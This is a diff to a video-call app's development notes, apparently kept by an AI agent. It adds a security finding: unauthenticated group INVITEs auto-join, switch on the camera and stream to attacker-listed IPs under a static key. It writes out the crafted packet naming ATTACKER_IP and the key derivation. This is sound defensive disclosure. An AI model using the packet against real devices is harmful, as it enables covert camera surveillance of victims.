@@ -2060,3 +2060,26 @@ phi^2 + phi^-2 = 3 | TRINITY
   40s), while changing NO legitimate behavior. Verified LIVE: 5 no-participant spam datagrams -> 0 rings (was
   ringing "TRI-NET"), a valid INVITE -> 1 ring. Minimal + clearly-correct (not a policy judgment), so done
   autonomously; the harder "well-formed-but-fake INVITE still rings + blocks 40s" is left as a separate note.
+
+## WAVE 2026-07-22 #14 — SECURITY: unauthenticated forced-camera exfiltration via group INVITE (CONFIRMED live)
+
+- **SERIOUS privacy vuln, verified live.** The idle INVITE listener auto-joins ANY 3+ participant INVITE
+  (`participants.count > 2 -> acceptIncoming()`) with NO user Accept. `acceptIncoming` builds the call targets
+  from `inc.participants` — the ATTACKER-CONTROLLED IP list in the plaintext INVITE — and `startCall()` turns on
+  the camera and fans out video to them, sealed with a STATIC conference key
+  (`HKDF("tri-net-psk-v1", "conference", "group-aead")`) baked into every app instance.
+- **Exploit chain (LAN):** attacker sends `[FD 11] "x\nVICTIM,ATTACKER_IP,z\nEVILROOM"` to victim:7000 ->
+  victim auto-joins (room need NOT match — the count>2 arm bypasses the room check) -> victim's camera turns ON
+  and streams to ATTACKER_IP under the known static key -> attacker decrypts and watches. Zero interaction.
+  Verified: crafted packet produced `auto-joining group from attacker` -> `accepting call -> mesh back to
+  …192.168.1.240,241,242` -> `captureOutput first frame` -> `encoder 1280x720 @ 900kbps`.
+- **NOT fixed autonomously — it is a security/UX architecture decision the USER must own.** Every fix changes
+  the tested "call from Mac -> both iPhones just join" flow: (a) require room-match for auto-join (breaks
+  empty-room deployments); (b) gate on the caller being a discovered roster peer (resolveIP is ASYNC, no clean
+  sync check; and a LAN attacker running the app is still "discovered"); (c) never auto-join, always ring
+  (loses the UX); (d) ROOT FIX — derive the group key from a per-room/enrollment shared secret instead of a
+  static baked PSK, and/or authenticate the INVITE, so an outsider can neither trigger nor decrypt. Reported
+  with the menu; the user picks the trade-off. Both platforms share this code path (Mac CallManager + iOS
+  ViewModel).
+- **Lesson: an "auto-accept for convenience" path on an UNAUTHENTICATED plaintext trigger is a camera/mic
+  exfiltration primitive. Audit every auto-action reachable from the network for a caller-authentication gate.**
